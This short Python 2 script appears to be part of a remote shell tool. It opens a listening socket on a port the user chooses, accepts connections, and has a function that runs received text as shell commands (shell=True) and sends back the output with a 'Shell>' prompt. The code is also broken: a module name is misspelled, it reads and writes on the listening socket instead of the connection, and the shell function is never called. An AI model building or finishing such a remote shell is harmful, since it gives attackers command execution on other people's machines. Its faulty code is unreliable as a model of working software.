import os
import sys
import socket, subprocess
import time
from termcolor import colored, cprint

def sockListen():
	global CORE_STRING
	global host
	global port
	global s

	CORE_STRING  = colored("[listener]", 'blue')
	host = ''
	port = int(raw_input(CORE_STRING + " Port Number> "))
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.bind((host, port))
		cprint("[*] Binding Socket To Port...", 'green')
		time.sleep(1)

	except socket.error as y:
		cprint(str(y), 'red')

	s.listen(10)
	cprint("[!] Listening For Incoming Connections/Intervals...", 'green')

def sockAccept():
	global s
	global CORE_STRING

	try:
		while True:
			conn, addr = s.accept()
			print CORE_STRING + "Connection With: " + str(addr[0]) + ":" + str(addr[1])
                        s.recv(6000)

	except socket.error as w:
		cprint(str(w), 'red')

	except KeyboardInterrupt as y:
		cprint(str(y), 'red')
		sys.exit(0)

	except:
		pass

def CommandShell():
	data = s.recv(1024)

	if data.strip() == "exit":
		sys.exit(0)

	PROC = subrocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	OUTPUT = PROC.stdout.read() + PROC.stderr.read()
	s.send(OUTPUT)
	s.send("Shell> ")



